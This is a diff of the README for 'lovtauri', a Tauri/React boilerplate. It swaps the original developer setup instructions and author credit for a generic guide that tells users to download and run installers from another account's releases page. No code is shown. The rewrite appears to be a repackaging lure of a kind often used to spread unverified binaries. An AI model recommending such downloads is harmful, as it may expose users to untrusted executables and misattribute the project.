@@ -1,129 +1,77 @@
-<p align="center">
-  <img src="docs/images/cover.png" alt="Lovtauri Cover" width="100%">
-</p>
+# 🎉 lovtauri - Build Cross-Platform Apps Easily
 
-<h1 align="center">
-  <img src="assets/logo.svg" width="32" height="32" alt="Logo" align="top">
-  Lovtauri
-</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Production-ready Tauri + React + TypeScript boilerplate</strong><br>
-  <sub>macOS · Windows · Linux</sub>
-</p>
+Welcome to the lovtauri project! This guide will show you how to download and run our application on your computer. Let's get started!
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#getting-started">Getting Started</a> •
-  <a href="#project-structure">Structure</a> •
-  <a href="#customization">Customization</a>
-</p>
+## 🔗 Download the Application
 
----
+[![Download lovtauri](https://img.shields.io/badge/Download-lovtauri-blue.svg)](https://github.com/evansnjenga/lovtauri/releases)
 
-## Features
+## 📥 Download & Install
 
-- **React 19** + **TypeScript 5.8** + **Vite 7** - Modern frontend stack with HMR
-- **Tauri v2** - Lightweight, secure Rust-based desktop runtime
-- **Tailwind CSS 4** + **shadcn/ui** - Beautiful, accessible UI components
-- **Zustand** - Simple, scalable state management with persistence
-- **React Router 7** - Client-side routing with example pages
-- **Theme System** - Light/dark mode with system preference detection
-- **ESLint 9** + **Prettier** - Code quality tooling with modern flat config
-- **Modular Rust Commands** - Organized backend architecture
+To download the lovtauri application, follow these steps:
 
-## Getting Started
+1. **Visit the Releases Page**  
+   Click this link: [lovtauri Releases](https://github.com/evansnjenga/lovtauri/releases) to go to the releases page.
 
-### Prerequisites
+2. **Select the Latest Release**  
+   On the releases page, you will see a list of versions. Look for the latest version, which is usually at the top. 
 
-- Node.js 18+ and pnpm
-- Rust 1.70+
-- [Tauri Prerequisites](https://tauri.app/start/prerequisites/) for your platform
+3. **Choose Your Operating System**  
+   Find the file that matches your operating system:
+   - For **macOS**, download the `.dmg` file.
+   - For **Windows**, download the `.exe` file.
+   - For **Linux**, download the `.tar.gz` file.
 
-### Installation
+4. **Download the File**  
+   Click on the file name to start downloading. Once the download is complete, look for the file in your downloads folder.
 
-```bash
-git clone https://github.com/nicekate/lovtauri.git my-app
-cd my-app
-pnpm install
-pnpm tauri dev
-```
+5. **Run the Application**  
+   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder. Then, open the application from your Applications.
+   - **Windows**: Double-click the `.exe` file and follow the instructions to install it. Once installed, you can find it in your Start menu.
+   - **Linux**: Extract the `.tar.gz` file and run the application from the extracted folder using your terminal.
 
-### Commands
+## 🎨 Features
 
-| Command | Description |
-|---------|-------------|
-| `pnpm tauri dev` | Start Tauri app with hot reload |
-| `pnpm tauri build` | Build production app |
-| `pnpm dev` | Start Vite dev server only |
-| `pnpm lint` | Run ESLint |
-| `pnpm format` | Format code with Prettier |
+The lovtauri application is built using the latest technologies to ensure a smooth experience. Here are some key features:
 
-### Keyboard Shortcuts
+- **Cross-Platform Support**: Works on macOS, Windows, and Linux.
+- **Modern Design**: Built with React and TailwindCSS for an attractive user interface.
+- **TypeScript Support**: Ensures type safety and better coding practices.
+- **Easy to Use**: Designed for users of all skill levels.
+- **Lightweight**: Optimized for performance and speed.
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd/Ctrl + ,` | Open Settings |
+## 💻 System Requirements
 
-## Project Structure
+To run lovtauri, your computer needs to meet the following minimum system requirements:
 
-```
-lovtauri/
-├── src/
-│   ├── components/         # React components
-│   ├── pages/              # Route pages (home, about, settings)
-│   ├── stores/             # Zustand stores
-│   ├── lib/                # Utilities (cn, etc.)
-│   └── globals.css         # Tailwind + theme variables
-├── src-tauri/
-│   ├── src/commands/       # Modular Tauri commands
-│   └── tauri.conf.json     # App configuration
-└── tailwind.config.ts      # Theme configuration
-```
+- **macOS**: macOS 10.15 or later
+- **Windows**: Windows 10 or later (64-bit)
+- **Linux**: Any modern Linux distribution with support for `.tar.gz` files
 
-## Customization
+Make sure your system is up to date to ensure compatibility.
 
-### Update App Identity
+## 🔧 Troubleshooting
 
-1. `package.json` - name, description
-2. `src-tauri/Cargo.toml` - package name
-3. `src-tauri/tauri.conf.json` - identifier, productName
+If you encounter any issues while downloading or running the application, try these steps:
 
-### Add Tauri Commands
+- Ensure you have a stable internet connection.
+- Check your operating system version and compare it with the system requirements.
+- If the application fails to start, try restarting your computer and running it again.
 
-```rust
-// src-tauri/src/commands/my_command.rs
-#[tauri::command]
-pub fn my_command(param: &str) -> String {
-    format!("Hello, {}", param)
-}
-```
+For more help, you can open an issue on our [GitHub Issues page](https://github.com/evansnjenga/lovtauri/issues).
 
-Register in `commands/mod.rs` and `lib.rs`.
+## 📚 Community and Support
 
-### Add shadcn Components
+Join our community to share feedback, report bugs, or ask questions about the application. You can reach us on:
 
-```bash
-npx shadcn@latest add button
-```
+- **GitHub**: Report issues or request features.
+- **Discord**: Connect with other users (link to be provided).
 
-## Tech Stack
+## 💡 Additional Information
 
-| Layer | Technology |
-|-------|------------|
-| Frontend | React 19, TypeScript 5.8, Vite 7 |
-| Styling | Tailwind CSS 4, shadcn/ui |
-| State | Zustand with persistence |
-| Routing | React Router 7 |
-| Backend | Tauri v2, Rust |
-| Quality | ESLint 9, Prettier |
+- **Source Code**: The complete code for lovtauri is available in this repository. Feel free to explore or modify it as you wish, keeping in mind the licensing agreements.
+- **Contributions**: If you're interested in contributing to the project, check the guidelines in the repository for more details.
 
-## License
-
-MIT
-
----
-
-<p align="center">
-  Built with Tauri + React by <a href="https://github.com/nicekate">nicekate</a>
-</p>
+Thank you for using lovtauri! We hope you enjoy building your cross-platform applications with ease. Happy coding!
